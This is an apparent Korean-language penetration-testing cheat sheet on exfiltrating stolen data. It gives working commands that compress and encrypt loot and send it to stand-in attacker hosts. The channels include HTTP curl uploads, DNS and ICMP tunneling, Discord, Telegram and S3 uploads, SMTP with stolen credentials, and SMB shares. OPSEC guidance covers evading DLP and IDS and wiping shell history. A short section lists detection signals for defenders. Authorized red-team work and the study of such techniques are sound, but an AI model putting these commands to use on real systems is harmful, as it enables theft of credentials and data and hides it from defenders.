# 데이터 유출 (Exfiltration)

수집한 자료(credential 덤프, 소스 코드, DB 백업, 문서 등) 를 공격자 인프라로 빼내는 단계.
탐지 회피와 인게이지먼트 룰(허용 채널/대역폭/도메인) 준수가 핵심.

---

## 사전 작업

```bash
# 압축 + 암호화 (대량/민감 데이터)
7z a -p'<long_pass>' -mhe=on loot.7z ./loot/
tar czf - ./loot | openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:'<pw>' > loot.tar.gz.enc

# 분할 (사이즈 제한 우회 / 청크별 전송)
split -b 5M loot.7z loot.7z.part_

# 무결성 (재조립 후 검증)
sha256sum loot.7z > loot.sha256
```

---

## HTTP / HTTPS

가장 일반적이며 합법 트래픽 흉내 내기 좋음. 가능하면 **TLS + 정식 도메인 + 평판 좋은 호스팅**.

```bash
# 단일 파일 PUT (공격자 측 단순 수신 서버)
curl -k -X POST -F 'f=@loot.7z' https://exfil.example.com/upload

# Webhook 류 (작은 데이터)
curl -X POST -H 'Content-Type: application/json' \
  -d "{\"d\":\"$(base64 -w0 secret)\"}" https://attacker.example.com/in

# Python one-liner
python3 -c "import requests; requests.post('https://x/y', files={'f': open('loot.7z','rb')})"

# Powershell
Invoke-RestMethod -Uri https://x/y -Method Post -InFile .\loot.7z

# 청크 업로드 (차단/IDS 회피)
for f in loot.7z.part_*; do curl -F "f=@${f}" https://x/y; sleep $((RANDOM%30+10)); done
```

수신 서버 예 (uploadserver):

```bash
pip install uploadserver
python3 -m uploadserver 443 --server-certificate cert.pem
```

---

## DNS Tunneling

방화벽이 외부 HTTP 를 모두 막아도 **재귀 DNS** 는 열려있는 경우 多. 대역폭 매우 낮음 → 작은 데이터(credential, 문서) 위주.

```bash
# dnscat2
dnscat2-server <attacker_domain>          # 공격자
dnscat2-client <attacker_domain>          # target

# iodine (TUN 인터페이스, 더 빠름)
iodined -f -P '<pw>' 10.0.0.1 t.attacker.com    # 공격자
iodine -f -P '<pw>' t.attacker.com               # target

# 직접 인코딩 (도구 없이)
for c in $(base32 secret | fold -w50); do dig +short ${c}.exfil.attacker.com; done
```

전제: 공격자가 `attacker.com` NS 를 자신의 IP 로 위임받아야 함.

---

## ICMP Tunneling

ICMP 가 외부로 허용되는 환경에서 사용.

```bash
# icmpsh
icmpsh-m.py <attacker_ip> <victim_ip>     # 공격자
icmpsh.exe -t <attacker_ip>               # target (Windows)

# hans (TUN over ICMP)
sudo hans -s 10.1.2.0 -p '<pw>'           # 공격자
sudo hans -c <attacker_ip> -p '<pw>'      # target
```

---

## 합법 클라우드 / SaaS 채널

대기업 환경에서는 합법 도메인이 자주 화이트리스트. **사용 시 인게이지먼트 룰로 사전 승인 필수**.

```bash
# transfer.sh / 0x0.st (공개 임시 호스팅)
curl --upload-file loot.7z https://transfer.sh/loot.7z
curl -F 'file=@loot.7z' https://0x0.st

# Mega
megatools put loot.7z

# AWS S3 (공격자 버킷)
aws s3 cp loot.7z s3://attacker-bucket/ --no-sign-request

# Azure Blob
az storage blob upload --account-name <acct> --container c --name loot.7z --file loot.7z

# Slack / Discord / Telegram webhook
curl -F file=@loot.7z -F "channels=<chan>" -H "Authorization: Bearer <token>" \
  https://slack.com/api/files.upload
curl -F "file=@loot.7z" "https://discord.com/api/webhooks/<id>/<token>"
curl -F "document=@loot.7z" \
  "https://api.telegram.org/bot<token>/sendDocument?chat_id=<id>"

# GitHub Gist / Pastebin (텍스트 한정)
gh gist create -p secret.txt
```

---

## 메일

OWA / SMTP 가 외부로 허용되면 자기 자신 또는 외부 주소로 송신.

```bash
# 합법 SMTP (인증된 내부 사용자로)
swaks --to attacker@gmail.com --from <user>@<domain> \
  --server <internal_smtp> --auth LOGIN --auth-user <user> --auth-password '<pass>' \
  --header "Subject: report" --attach @loot.7z

# OWA / Graph API (O365 환경)
# Outlook 자동화 (powershell)
$mail = New-Object -ComObject Outlook.Application
$msg = $mail.CreateItem(0)
$msg.To = "attacker@example.com"; $msg.Attachments.Add('C:\loot.7z'); $msg.Send()
```

---

## SMB / WebDAV (내부 망)

**내부 피봇 호스트** 까지만 보낸 뒤 그곳에서 다시 외부로 빼낼 때 유용.

```bash
# 공격자 임시 SMB 서버
impacket-smbserver share /tmp/loot -smb2support -username u -password p

# target에서
copy C:\loot.7z \\<attacker_ip>\share\
robocopy C:\loot \\<attacker_ip>\share /E /Z

# WebDAV PUT
curl -T loot.7z http://<attacker>/webdav/
```

---

## 저속/스니크 채널

대량 트래픽이 IDS/DLP 에 잡힐 때.

```bash
# Steganography - 이미지에 숨김
steghide embed -cf cover.jpg -ef secret.txt -p '<pw>'

# Twitter/Discord/Reddit 등 SNS 텍스트 인코딩 (작은 데이터)
# 공격자 RSS/봇이 폴링

# 인쇄 작업 / 클립보드 / OneNote 동기화 등 비정상 채널
```

---

## OPSEC / 탐지 회피

| 항목 | 권장 |
|------|------|
| 시간대 | target 업무 시간 내 (오프타임은 더 의심) |
| 대역폭 | 대용량은 분할 + 지터 + 시간 분산 |
| 도메인 | 평판 있는 TLD + Let's Encrypt + 카테고라이즈된 도메인 |
| 프로토콜 | TLS 우선, ALPN/JA3 정상 클라이언트 위장 |
| 데이터 | 항상 압축 + 암호화 (DLP 시그니처 회피) |
| 정리 | 압축물/스크립트/임시 파일 제거 (`shred -uvz`, `cipher /w`) |

---

## DLP / 탐지 시그널

- 비정상 외부 도메인으로 **대용량 업로드** (NetFlow, 프록시 로그)
- 같은 호스트가 짧은 시간에 **다양한 외부 IP** 와 통신
- DNS 쿼리량 급증 + **긴 subdomain + 비정상 인코딩 패턴** (DNS Tunneling 시그니처)
- ICMP 패킷의 **비정상 payload 사이즈** 또는 빈도
- 평소 인터넷을 거의 안 쓰는 서비스 계정/서버에서 외부 통신 발생

---

## 정리 체크리스트

- [ ] 압축/암호화 파일 안전 폐기 (`shred -uvz loot.7z`)
- [ ] 사용한 임시 클라우드 버킷/링크 삭제
- [ ] PowerShell 히스토리 / `~/.bash_history` 정리 (필요 시)
- [ ] 추가한 신뢰 인증서 / 라우팅 / hosts 항목 원복
- [ ] 인게이지먼트 보고서에 채널/시간/볼륨/해시 기록
